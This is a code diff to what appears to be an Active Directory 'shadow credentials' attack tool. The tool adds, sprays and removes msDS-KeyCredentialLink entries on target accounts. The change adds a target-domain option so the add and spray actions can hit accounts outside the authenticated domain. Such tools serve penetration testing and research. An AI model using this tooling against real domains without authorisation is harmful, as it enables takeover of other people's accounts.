@@ -72,13 +72,14 @@ def init_ldap_connection(target, tls_version, args, domain, username, password, 
 
 
 def init_ldap_session(args, domain, username, password, lmhash, nthash):
+    target_domain = args.target_domain if args.target_domain is not None else args.auth_domain
     if args.use_kerberos:
-        target = get_machine_name(args, domain)
+        target = get_machine_name(args, target_domain)
     else:
         if args.dc_ip is not None:
             target = args.dc_ip
         else:
-            target = domain
+            target = target_domain
 
     if args.use_ldaps is True:
         try:
@@ -738,6 +739,7 @@ def parse_args():
     target.add_argument("-t", "--target", type=str, dest="target_samname", help="Target account")
     target.add_argument("-tl", "--target-list", type=str, dest="target_samname_list", help="Path to a file with target accounts names (one per line)")
 
+    parser.add_argument("-td", "--target-domain", type=str, dest="target_domain", help="Domain of the target (if different from the authenticated domain user)")
     parser.add_argument("-a", "--action", choices=['list', 'add', 'spray', 'remove', 'clear', 'info', 'export', 'import'], nargs='?', default='list', help='Action to operate on msDS-KeyCredentialLink')
     parser.add_argument('--use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
     parser.add_argument("-v", "--verbose", dest="verbosity", action="count", default=0, help="verbosity level (-v for verbose, -vv for debug)")
@@ -807,15 +809,17 @@ def main():
         else:
             auth_nt_hash = args.auth_hashes
 
+    target_domain = args.target_domain if args.target_domain is not None else args.auth_domain
+
     try:
         ldap_server, ldap_session = init_ldap_session(args=args, domain=args.auth_domain, username=args.auth_username, password=args.auth_password, lmhash=auth_lm_hash, nthash=auth_nt_hash)
         shadowcreds = ShadowCredentials(ldap_server, ldap_session, target_samname)
         if args.action == 'list':
             shadowcreds.list()
         elif args.action == 'add':
-            shadowcreds.add(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain)
+            shadowcreds.add(password=args.pfx_password, path=args.filename, export_type=args.export, domain=target_domain)
         elif args.action == 'spray':
-            shadowcreds.spray(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain)
+            shadowcreds.spray(password=args.pfx_password, path=args.filename, export_type=args.export, domain=target_domain)
         elif args.action == 'remove':
             shadowcreds.remove(args.device_id)
         elif args.action == 'info':
